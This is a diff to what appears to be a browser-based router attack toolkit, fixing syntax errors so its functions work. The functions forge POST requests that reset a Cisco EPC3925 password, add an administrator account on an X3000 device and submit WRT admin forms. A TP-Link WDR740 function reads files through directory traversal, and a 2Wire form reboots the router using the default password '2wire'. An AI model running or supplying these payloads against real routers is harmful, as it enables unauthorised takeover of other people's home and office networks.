@@ -312,7 +312,8 @@ function epc3925_changepassword(ip)
 {
     ip = ip || "192.168.0.1";
     pwd = prompt("Password: ");
-    form = '<input type="hidden" name="Password" value="attackers_password' + pwd + '"><input type="hidden" name="PasswordReEnter" value="' + pwd '"><input type="hidden" name="save" value="Save Settings">';
+    form = '<input type="hidden" name="Password" value="attackers_password' + pwd + '"><input type="hidden" name="PasswordReEnter" value="' + pwd +'">\
+    <input type="hidden" name="save" value="Save Settings">';
 	post('http://' + ip + '/goform/Quick_setup', form);
 
 }
@@ -338,10 +339,10 @@ function x3000_addadmin(ip)
 	<input	type="hidden"	name="delete_groups"	value=""/>\
 	<input	type="hidden"	name="Modify_Account_Name"	value=""/>\
 	<input	type="hidden"	name="Add_Account_Name"	value="' + name + '"/>\
-	<input	type="hidden"	name="full_name"	value="' + name '"/>\
-	<input	type="hidden"	name="user_desc"	value="' + name '"/>\
-	<input	type="hidden"	name="Add_Account_Password"	value="' + pwd '"/>\
-	<input	type="hidden"	name="Add_Account_PasswordConfirm"	value="' + name '"/>\
+	<input	type="hidden"	name="full_name"	value="' + name + '"/>\
+	<input	type="hidden"	name="user_desc"	value="' + name + '"/>\
+	<input	type="hidden"	name="Add_Account_Password"	value="' + pwd + '"/>\
+	<input	type="hidden"	name="Add_Account_PasswordConfirm"	value="' + name +'"/>\
 	<input	type="hidden"	name="Add_Account_Group"	value="admin"/>\
 	</form>';
 	
@@ -625,7 +626,7 @@ function wrtadmin() {
 	if (ip==null || ip==""){}else{
 		document.wrtadmin.submit();
 	}
-
+}
 // TP-Link WDR740ND/WDR740N - Directory Traversal
 function wdr740_dirtraversal(ip)
 {
@@ -635,7 +636,6 @@ function wdr740_dirtraversal(ip)
 	document.location = "http://" + ip + "/help/../../../../../../../../../../../../../../../.." + path;
 }
 
-}
 function wrtadminr() {
 	ip=prompt("IP:");
 	document.wrtadmin.action="http://"+ip+"/manage.tri";
@@ -1906,7 +1906,6 @@ a=a+1
 <input type="hidden" name="NEXTPAGE" value="J21_REBOOT">
 <input type="hidden" name="PASSWORD" value="2wire">
 </form>
-</section>
 <section id="wire">
 <h2>2Wire</h2>
 <h3><a href="javascript:img('4011G')">4011G</a>, <a href="javascript:img('5012NV')">5012NV</a>, <a href="javascript:img('1700HG')">1700HG</a>, <a href="javascript:img('1701HG')">1701HG</a>, <a href="javascript:img('1800HW')">1800HW</a>, <a href="javascript:img('2071HG')">2071HG</a>, <a href="javascript:img('2700HG')">2700HG</a>, <a href="javascript:img('2701HG-T')">2701HG-T</a>, <a href="javascript:img('2701HGV-E')">2701HGV-E</a>, <a href="javascript:img('2700HGV-2')">2700HGV-2</a>, <a href="javascript:img('3800HGV-B')">3800HGV-B</a></h3>
